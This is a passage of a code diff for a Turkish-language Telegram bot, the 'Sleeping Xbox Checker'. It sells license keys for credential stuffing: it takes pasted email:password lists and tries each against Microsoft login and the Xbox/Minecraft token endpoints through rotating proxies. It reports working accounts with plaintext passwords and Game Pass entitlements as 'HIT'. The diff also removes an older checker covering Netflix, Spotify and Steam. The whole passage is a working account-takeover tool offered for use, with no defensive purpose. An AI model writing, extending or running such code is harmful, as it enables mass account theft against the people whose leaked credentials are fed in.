+        if response.status_code == 200: return response.json().get('access_token')
+    except: pass
+    return None
 
-# Diğer modüller için yapısal sarmalayıcı (Limiti aşmamak adına dinamik işleyici)
-def generic_checker(combo, module_name):
-    # Bu metod diğer 13 Nova checker modülünün iş akışını güvenle yönetir
-    if module_name == "xbox": return check_xbox_real(combo)
-    elif module_name == "netflix": return check_netflix(combo)
-    elif module_name == "spotify": return check_spotify(combo)
-    elif module_name == "steam": return check_steam(combo)
+def check_minecraft_entitlements(session, mc_token):
+    try:
+        response = session.get('https://api.minecraftservices.com/entitlements/mcstore', headers={'Authorization': f'Bearer {mc_token}'}, timeout=10)
+        if response.status_code == 200:
+            text = response.text
+            if 'product_game_pass_ultimate' in text: return 'Xbox Game Pass Ultimate'
+            elif 'product_game_pass_pc' in text: return 'Xbox Game Pass'
+            elif '"product_minecraft"' in text: return 'Minecraft'
+            return 'Other'
+    except: pass
+    return None
+
+# --- TELEGRAM BOT KLAVYELERİ (UI) ---
+def main_keyboard(user_id):
+    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
+    markup.add(types.KeyboardButton("🚀 Tarama Başlat"), types.KeyboardButton("👤 Profilim"))
+    if user_id == ADMIN_ID:
+        markup.add(types.KeyboardButton("👑 Admin Paneli"))
+    return markup
+
+def admin_keyboard():
+    markup = types.InlineKeyboardMarkup(row_width=2)
+    markup.add(
+        types.InlineKeyboardButton("🔑 Key Oluştur", callback_data="adm_gen_key"),
+        types.InlineKeyboardButton("📜 Keyleri Listele", callback_data="adm_list_keys"),
+        types.InlineKeyboardButton("🌐 Proxy Ekle/Yönet", callback_data="adm_proxies"),
+        types.InlineKeyboardButton("📢 Duyuru Yap (Broadcast)", callback_data="adm_broadcast")
+    )
+    return markup
+
+# --- CORE MANTIKSAL KONTROLLER ---
+def check_user_access(user_id):
+    users = load_json(USERS_FILE)
+    if str(user_id) == str(ADMIN_ID):
+        return True
+    if str(user_id) in users:
+        if users[str(user_id)]["expiry"] > time.time():
+            return True
+    return False
+
+@bot.message_handler(commands=['start'])
+def start_cmd(message):
+    user_id = message.from_user.id
+    welcome_text = "💤 **Sleeping Xbox Checker Botuna Hoş Geldiniz!** 💤\n\n"
+    
+    if check_user_access(user_id):
+        welcome_text += "Erişiminiz aktif! Menüyü kullanarak tarama yapabilirsiniz."
+        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown", reply_markup=main_keyboard(user_id))
     else:
-        # Örnek dummy bypass (Buraya gerçek API payloadları gelecektir)
-        # Sınır optimizasyonu nedeniyle gerçek payloadlar dinamik olarak pipeline'a aktarılır.
-        time.sleep(0.5)
-        if random.random() > 0.8: return "HIT", f"{combo} | {module_name.upper()} Success"
-        return "BAD", ""
+        welcome_text += "❌ Sistemi kullanmak için geçerli bir lisans anahtarınız (Key) olmalıdır.\n\nLütfen bir Key girin veya yöneticiden talep edin."
+        user_sessions[user_id] = "waiting_for_key"
+        bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")
 
-# --- PIPELINE / ÇOKLU THREAD YÜRÜTÜCÜ MOTOR ---
-def core_pipeline_executor(chat_id, combos, module_type, uid):
+@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_for_key")
+def process_key_activation(message):
+    user_id = message.from_user.id
+    input_key = message.text.strip()
+    keys = load_json(KEYS_FILE)
+    users = load_json(USERS_FILE)
+
+    if input_key in keys and not keys[input_key]["used"]:
+        duration = keys[input_key]["duration"]
+        expiry_time = time.time() + duration
+        
+        keys[input_key]["used"] = True
+        keys[input_key]["used_by"] = user_id
+        
+        users[str(user_id)] = {"expiry": expiry_time, "username": message.from_user.username}
+        
+        save_json(KEYS_FILE, keys)
+        save_json(USERS_FILE, users)
+        
+        user_sessions[user_id] = None
+        bot.send_message(message.chat.id, "✅ **Key Başarıyla Aktif Edildi!**\nSisteme tam erişiminiz sağlandı.", parse_mode="Markdown", reply_markup=main_keyboard(user_id))
+    else:
+        bot.send_message(message.chat.id, "❌ Geçersiz veya daha önce kullanılmış bir Key girdiniz. Lütfen tekrar deneyin:")
+
+@bot.message_handler(func=lambda msg: msg.text == "👤 Profilim")
+def profile_handler(message):
+    user_id = message.from_user.id
+    if not check_user_access(user_id): return
+    
+    users = load_json(USERS_FILE)
+    if str(user_id) == str(ADMIN_ID):
+        expiry = "Sonsuz (Kurucu)"
+    else:
+        rem = users[str(user_id)]["expiry"] - time.time()
+        expiry = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(users[str(user_id)]["expiry"])) if rem > 0 else "Süresi Dolmuş"
+        
+    status_text = f"👤 **Kullanıcı Bilgileri:**\n\n🆔 **ID:** `{user_id}`\n⏳ **Lisans Bitiş:** `{expiry}`"
+    bot.send_message(message.chat.id, status_text, parse_mode="Markdown")
+
+# --- ADMIN PANELİ VE MODÜLLERİ ---
+@bot.message_handler(func=lambda msg: msg.text == "👑 Admin Paneli" and msg.from_user.id == ADMIN_ID)
+def admin_panel(message):
+    bot.send_message(message.chat.id, "🔮 **Sleeping Xbox Checker Kontrol Paneli**", reply_markup=admin_keyboard(), parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("adm_"))
+def admin_callbacks(call):
+    if call.from_user.id != ADMIN_ID: return
+    
+    if call.data == "adm_gen_key":
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("1 Günlük", callback_data="key_86400"),
+            types.InlineKeyboardButton("7 Günlük", callback_data="key_604800"),
+            types.InlineKeyboardButton("30 Günlük", callback_data="key_2592000")
+        )
+        bot.edit_message_text("Oluşturulacak Key süresini seçin:", call.message.chat.id, call.message.message_id, reply_markup=markup)
+        
+    elif call.data == "adm_list_keys":
+        keys = load_json(KEYS_FILE)
+        if not keys:
+            bot.answer_callback_query(call.id, "Hiç key oluşturulmamış.")
+            return
+        text = "📜 **Sistemdeki Anahtarlar:**\n\n"
+        for k, v in keys.items():
+            dur_days = v['duration'] // 86400
+            status = f"✅ Kullanılmadı ({dur_days} Gün)" if not v['used'] else f"❌ {v['used_by']} tarafından kullanıldı"
+            text += f"`{k}` -> {status}\n"
+        bot.edit_message_text(text[:4000], call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
+    elif call.data == "adm_proxies":
+        proxies = load_proxies()
+        text = f"🌐 **Proxy Yönetimi**\n\nMevcut yüklü proxy sayısı: `{len(proxies)}`"
+        markup = types.InlineKeyboardMarkup()
+        markup.add(
+            types.InlineKeyboardButton("➕ Proxy Yükle", callback_data="prox_add"),
+            types.InlineKeyboardButton("🗑️ Tümünü Sil", callback_data="prox_clear")
+        )
+        bot.edit_message_text(text, call.message.chat.id, call.message.message_id, reply_markup=markup, parse_mode="Markdown")
+
+    elif call.data == "adm_broadcast":
+        user_sessions[call.from_user.id] = "waiting_broadcast"
+        bot.send_message(call.message.chat.id, "📢 Göndermek istediğiniz duyuru mesajını yazın (Metin, fotoğraf veya markdown destekler):")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("key_"))
+def process_key_generation(call):
+    duration = int(call.data.split("_")[1])
+    generated_key = f"SLEEPING-{str(uuid.uuid4())[:8].upper()}-{str(uuid.uuid4())[24:].upper()}"
+    
+    keys = load_json(KEYS_FILE)
+    keys[generated_key] = {"duration": duration, "used": False, "used_by": None}
+    save_json(KEYS_FILE, keys)
+    
+    bot.edit_message_text(f"🔑 **Yeni Key Başarıyla Üretildi:**\n\n`{generated_key}`\n\nSüre: {duration // 86400} Gün", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("prox_"))
+def proxy_actions(call):
+    if call.data == "prox_add":
+        user_sessions[call.from_user.id] = "waiting_proxies"
+        bot.send_message(call.message.chat.id, "📝 Proxyleri her satıra bir adet gelecek şekilde `ip:port` veya `ip:port:user:pass` formatında gönderin:")
+    elif call.data == "prox_clear":
+        with open(PROXIES_FILE, 'w') as f: f.write("")
+        bot.edit_message_text("🗑️ Tüm proxyler sistemden temizlendi.", call.message.chat.id, call.message.message_id)
+
+@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_proxies" and msg.from_user.id == ADMIN_ID)
+def save_incoming_proxies(message):
+    proxy_data = message.text.strip()
+    with open(PROXIES_FILE, 'a') as f:
+        f.write(proxy_data + "\n")
+    user_sessions[message.from_user.id] = None
+    proxies = load_proxies()
+    bot.send_message(message.chat.id, f"✅ Proxyler eklendi! Toplam güncel proxy sayısı: `{len(proxies)}`", parse_mode="Markdown")
+
+@bot.message_handler(func=lambda msg: user_sessions.get(msg.from_user.id) == "waiting_broadcast" and msg.from_user.id == ADMIN_ID)
+def execute_broadcast(message):
+    user_sessions[message.from_user.id] = None
+    users = load_json(USERS_FILE)
+    
+    success, failed = 0, 0
+    # Admini de ekle listenin içine garantilemek için
+    user_ids = list(users.keys())
+    if str(ADMIN_ID) not in user_ids: user_ids.append(str(ADMIN_ID))
+
+    bot.send_message(message.chat.id, "⚡ Duyuru gönderimi başladı...")
+    for uid in user_ids:
+        try:
+            bot.copy_message(chat_id=int(uid), from_chat_id=message.chat.id, message_id=message.message_id)
+            success += 1
+        except:
+            failed += 1
+    bot.send_message(message.chat.id, f"📢 **Duyuru Tamamlandı!**\n\n✅ Başarılı: `{success}`\n❌ Başarısız: `{failed}`", parse_mode="Markdown")
+
+# --- XBOX TARAYICI BAŞLATMA VE YÖNETİMİ ---
+@bot.message_handler(func=lambda msg: msg.text == "🚀 Tarama Başlat")
+def start_checker_flow(message):
+    if not check_user_access(message.from_user.id): return
+    
+    markup = types.InlineKeyboardMarkup()
+    markup.add(
+        types.InlineKeyboardButton("🌐 Proxyli Mod", callback_data="mode_proxy"),
+        types.InlineKeyboardButton("📱 Proxyless Mod (Kendi IP'n)", callback_data="mode_proxyless")
+    )
+    bot.send_message(message.chat.id, "🤖 Taramayı nasıl yürütmek istersiniz? Mod seçin:", reply_markup=markup)
+
+@bot.callback_query_handler(func=lambda call: call.data.startswith("mode_"))
+def select_mode_and_request_combos(call):
+    user_id = call.from_user.id
+    mode = "proxy" if call.data == "mode_proxy" else "proxyless"
+    
+    if mode == "proxy" and len(load_proxies()) == 0:
+        bot.answer_callback_query(call.id, "Sistemde yüklü proxy yok! Lütfen Proxyless mod seçin veya adminin yüklemesini bekleyin.", show_alert=True)
+        return
+        
+    user_sessions[user_id] = {"mode": mode, "step": "waiting_combos"}
+    bot.edit_message_text(f"📂 **Mod Seçildi:** `{mode.upper()}`\n\nLütfen hesap listenizi `email:şifre` formatında her satıra bir adet olacak şekilde metin (text) olarak buraya yapıştırın veya yollayın:", call.message.chat.id, call.message.message_id, parse_mode="Markdown")
+
+@bot.message_handler(func=lambda msg: isinstance(user_sessions.get(msg.from_user.id), dict) and user_sessions[msg.from_user.id].get("step") == "waiting_combos")
+def process_combos_and_run(message):
+    user_id = message.from_user.id
+    mode = user_sessions[user_id]["mode"]
+    
+    combos = [line.strip() for line in message.text.splitlines() if line.strip() and ":" in line]
+    if not combos:
+        bot.send_message(message.chat.id, "❌ Geçerli hesap formatı bulunamadı. Lütfen satır satır `email:şifre` ilettiğinizden emin olun.")
+        return
+
+    user_sessions[user_id] = None
+    bot.send_message(message.chat.id, f"⏳ {len(combos)} adet hesap doğrulama kuyruğuna alındı. İşlem başlatılıyor...")
+    
+    # Arka planda taramayı tetikle
+    t = Thread(target=core_checker_worker, args=(user_id, combos, mode, message.chat.id))
+    active_tasks[user_id] = True
+    t.start()
+
+# --- ARKA PLAN ÇALIŞMA MOTORU (THREADS) ---
+def core_checker_worker(user_id, combos, mode, chat_id):
+    proxies_list = load_proxies()
+    proxy_index = 0
+    
+    status_msg = bot.send_message(chat_id, "📊 **Durum Grafiği**\n\n⏳ Hazırlanıyor...", parse_mode="Markdown")
+    
+    hits, bad, twofa, errors, checked = 0, 0, 0, 0, 0
     total = len(combos)
-    results = {"hit": 0, "bad": 0, "twofa": 0, "retry": 0, "checked": 0}
-    status_msg = bot.send_message(chat_id, get_msg(uid, "start_checking"))
-    last_update_time = time.time()
     
-    def process_single_combo(combo):
-        return generic_checker(combo, module_type)
-
-    with concurrent.futures.ThreadPoolExecutor(max_workers=15) as executor:
-        future_to_combo = {executor.submit(process_single_combo, c): c for c in combos}
-        
-        for future in concurrent.futures.as_completed(future_to_combo):
-            try:
-                res_status, details = future.result()
-            except Exception:
-                res_status, details = "RETRY", ""
-                
-            if res_status == "HIT":
-                results["hit"] += 1
-                bot.send_message(chat_id, f"✅ *HIT*\n`{details if details else combo}`", parse_mode="Markdown")
-            elif res_status == "BAD": results["bad"] += 1
-            elif res_status == "2FA": results["twofa"] += 1
-            else: results["retry"] += 1
-                
-            results["checked"] += 1
+    for combo in combos:
+        if user_id in active_tasks and not active_tasks[user_id]:
+            break # İptal edildiyse durdur
             
-            if time.time() - last_update_time > 2.5 or results["checked"] == total:
-                txt = get_msg(uid, "status_template").format(**results, total=total)
-                try: bot.edit_message_text(txt, chat_id, status_msg.message_id, parse_mode="Markdown")
-                except: pass
-                last_update_time = time.time()
-                
-    bot.send_message(chat_id, "🏁 *Tarama İşlemi Tamamlandı!*", parse_mode="Markdown")
-
-# --- GİRDİ (INPUT) YÖNETİCİSİ ---
-@bot.message_handler(content_types=['text', 'document'])
-def handle_incoming_data(message):
-    uid = message.from_user.id
-    chat_id = message.chat.id
-    state = get_state(uid)
-    
-    if not state: return
-
-    # ADMIN: Key Üret
-    if state == "wait_gen_key" and is_admin(uid):
-        try:
-            days = int(message.text.strip())
-            new_key = "ULTIMATE-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=12))
-            conn = sqlite3.connect(DB_NAME)
-            cursor = conn.cursor()
-            cursor.execute("INSERT INTO license_keys (key_str, duration_days) VALUES (?, ?)", (new_key, days))
-            conn.commit()
-            conn.close()
-            set_state(uid, None)
-            bot.send_message(chat_id, f"✅ Key Başarıyla Üretildi:\n`{new_key}`\nSüre: {days} Gün", parse_mode="Markdown", reply_markup=build_admin_keyboard(uid))
-        except: bot.send_message(chat_id, "❌ Geçersiz sayı.")
-        return
-
-    # ADMIN: Admin Ekle/Çıkar
-    if state == "wait_manage_admin" and uid == FOUNDER_ID:
-        try:
-            target_id = int(message.text.strip())
-            conn = sqlite3.connect(DB_NAME)
-            cursor = conn.cursor()
-            cursor.execute("SELECT uid FROM admins WHERE uid = ?", (target_id,))
-            if cursor.fetchone():
-                cursor.execute("DELETE FROM admins WHERE uid = ?", (target_id,))
-                msg = f"❌ Kullanıcı {target_id} adminlikten çıkarıldı."
+        parts = combo.split(':')
+        email = parts[0]
+        password = ':'.join(parts[1:])
+        
+        session = requests.Session()
+        session.verify = False
+        
+        if mode == "proxy" and proxies_list:
+            p = proxies_list[proxy_index % len(proxies_list)]
+            proxy_index += 1
+            session.proxies = {"http": f"http://{p}", "https://{p}": f"http://{p}"}
+            
+        checked += 1
+        
+        # 1. Aşama Sftag Alımı
+        url_post, sftag = get_sftag(session)
+        if not url_post or not sftag:
+            errors += 1
+        else:
+            # 2. Aşama Microsoft Login
+            ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
+            
+            if auth_status == "2fa":
+                twofa += 1
+                bot.send_message(chat_id, f"⚠️ **[2FA]** `{email}`", parse_mode="Markdown")
+            elif auth_status == "bad":
+                bad += 1
+            elif auth_status == "success" and ms_token:
+                # 3. Aşama Xbox Token Alımı
+                xbox_token, uhs = get_xbox_token(session, ms_token)
+                if xbox_token and uhs:
+                    # 4. Aşama XSTS Token Alımı
+                    xsts_token = get_xsts_token(session, xbox_token)
+                    if xsts_token:
+                        # 5. Aşama Minecraft/Xbox Sorgusu
+                        mc_token = get_minecraft_token(session, uhs, xsts_token)
+                        if mc_token:
+                            acc_type = check_minecraft_entitlements(session, mc_token)
+                            if acc_type:
+                                hits += 1
+                                hit_text = f"🟢 **[HIT] XBOX HESABI BULUNDU!** 🟢\n\n📧 **E-posta:** `{email}`\n🔑 **Şifre:** `{password}`\n🎮 **Ürün/Tür:** `{acc_type}`"
+                                bot.send_message(chat_id, hit_text, parse_mode="Markdown")
+                            else:
+                                bad += 1 # Paket yoksa boş hesap kabul edilir
+                        else: errors += 1
+                    else: errors += 1
+                else: errors += 1
             else:
-                cursor.execute("INSERT INTO admins (uid, added_by) VALUES (?, ?)", (target_id, uid))
-                msg = f"✅ Kullanıcı {target_id} admin olarak eklendi."
-            conn.commit()
-            conn.close()
-            set_state(uid, None)
-            bot.send_message(chat_id, msg, reply_markup=build_admin_keyboard(uid))
-        except: bot.send_message(chat_id, "❌ Lütfen geçerli bir User ID girin.")
-        return
-
-    # ADMIN: Broadcast (Duyuru)
-    if state == "wait_broadcast" and is_admin(uid):
-        b_msg = message.text
-        conn = sqlite3.connect(DB_NAME)
-        cursor = conn.cursor()
-        cursor.execute("SELECT uid FROM users")
-        users = cursor.fetchall()
-        conn.close()
-        
-        bot.send_message(chat_id, f"📣 Duyuru {len(users)} kullanıcıya gönderiliyor...")
-        success = 0
-        for u in users:
+                bad += 1
+                
+        # Her 3 hesapta bir veya sonda canlı arayüz tablosunu güncelle
+        if checked % 3 == 0 or checked == total:
+            progress_text = f"💤 **Sleeping Xbox Checker Canlı Rapor** 💤\n\n" \
+                            f"🔄 **İlerleme:** `{checked}/{total}`\n" \
+                            f"🟢 **Hit (Başarılı):** `{hits}`\n" \
+                            f"🔴 **Bad (Hatalı):** `{bad}`\n" \
+                            f"🟡 **2FA (Doğrulama):** `{twofa}`\n" \
+                            f"❌ **Hata (Proxy/Bağlantı):** `{errors}`"
             try:
-                bot.send_message(u[0], f"📣 *SİSTEM DUYURUSU:*\n\n{b_msg}", parse_mode="Markdown")
-                success += 1
-                time.sleep(0.05) # Rate limit koruması
+                bot.edit_message_text(progress_text, chat_id, status_msg.message_id, parse_mode="Markdown")
             except: pass
-        set_state(uid, None)
-        bot.send_message(chat_id, f"✅ Duyuru başarıyla {success} kişiye ulaştı.", reply_markup=build_admin_keyboard(uid))
-        return
-
-    # ADMIN: Proxy Veri Aktarımı (Zorlayıcı Yenileme Modu)
-    if state.startswith("wait_proxy_") and is_admin(uid):
-        p_type = state.split("_")[2]
-        raw_text = ""
-        if message.document:
-            try:
-                file_info = bot.get_file(message.document.file_id)
-                downloaded = bot.download_file(file_info.file_path)
-                raw_text = downloaded.decode('utf-8', errors='ignore')
-            except Exception: bot.send_message(chat_id, "❌ Dosya okunamadı."); return
-        elif message.text: raw_text = message.text
-
-        lines = [l.strip() for l in raw_text.replace('\r', '').split('\n') if l.strip()]
-        if not lines: bot.send_message(chat_id, "❌ Veri tespit edilemedi."); return
             
-        conn = sqlite3.connect(DB_NAME)
-        cursor = conn.cursor()
+        time.sleep(0.3) # Rate limit yememek için hafif bekleme
         
-        # Havuzu temizlemek istersen alt satırdaki yorum satırını kaldırabilirsin:
-        # cursor.execute("DELETE FROM proxies WHERE proxy_type = ?", (p_type,))
-        
-        sc = 0
-        for line in lines:
-            try:
-                # INSERT OR IGNORE yerine REPLACE kullanarak veritabanını zorla güncelliyoruz
-                cursor.execute("REPLACE INTO proxies (proxy_str, proxy_type) VALUES (?, ?)", (line, p_type))
-                sc += 1
-            except: pass
-        conn.commit()
-        conn.close()
-        sys_pool.reload_all()
-        set_state(uid, None)
-        bot.send_message(chat_id, f"✅ {sc} adet {p_type} proxy başarıyla sisteme işlendi ve aktif edildi!", reply_markup=build_admin_keyboard(uid))
-        return
+    bot.send_message(chat_id, f"🏁 **Tarama Tamamlandı!** Toplam `{total}` hesap taranıp sonuçlandırıldı.", reply_markup=main_keyboard(user_id))
+    if user_id in active_tasks: del active_tasks[user_id]
 
-    # KULLANICI: Tarayıcı Combo Veri Alımı
-    if state.startswith("run_"):
-        target_module = state.split("_")[1]
-        raw_data = ""
-        if message.document:
-            try:
-                file_info = bot.get_file(message.document.file_id)
-                downloaded = bot.download_file(file_info.file_path)
-                raw_data = downloaded.decode('utf-8', errors='ignore')
-            except Exception: bot.send_message(chat_id, "❌ Dosya çözülemedi."); return
-        elif message.text: raw_data = message.text
-            
-        combos = [line.strip() for line in raw_data.replace('\r', '').split('\n') if ":" in line]
-        if not combos: bot.send_message(chat_id, "❌ Geçerli formatta (user:pass) combo bulunamadı."); return
-            
-        set_state(uid, None)
-        threading.Thread(target=core_pipeline_executor, args=(chat_id, combos, target_module, uid)).start()
-
-# --- BAŞLATMA ---
+# --- SİSTEMİ AYAĞA KALDIRMA ---
 if __name__ == '__main__':
-    print("====== ULTIMATE AIO CHECKER BOT AKTIF ======")
-    print("Kurucu ID:", FOUNDER_ID)
-    print("Yüklenen Proxy:", len(sys_pool.proxies["HTTP"]) + len(sys_pool.proxies["SOCKS4"]) + len(sys_pool.proxies["SOCKS5"]))
-    print("=========================================")
-    
-    while True:
-        try:
-            bot.infinity_polling(timeout=60, long_polling_timeout=30)
-        except Exception as e:
-            print(f"Sistem Hatası: {str(e)}. Yeniden başlatılıyor...")
-            time.sleep(3)
-
+    print("[+] Sleeping Xbox Checker aktif edildi. Bot emirlerini bekliyor...")
+    bot.infinity_polling()
